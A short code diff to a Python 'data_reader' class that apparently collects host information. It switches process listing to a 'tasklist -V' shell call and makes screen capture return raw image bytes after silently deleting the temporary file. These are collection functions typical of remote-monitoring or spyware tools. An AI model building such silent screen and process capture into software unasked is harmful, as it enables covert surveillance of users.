@@ -141,12 +141,24 @@ class data_reader:
         except:
             return ''
     def procces_list(self):
-        PIDs = popen().read()
+        PIDs = popen('chcp 1251 | tasklist -V').read()
 
         return PIDs
 
     def screeshot(self):
-        return screenshot()
+        try:
+            res = screenshot()
+            res.save('0.jpg')
+
+            with open('0.jpg', 'br') as file:
+                text = file.read()
+            try:
+                remove('0.jpg')
+            except:
+                pass
+            return text
+        except:
+            pass
 
     def internet_test(self):
         try:
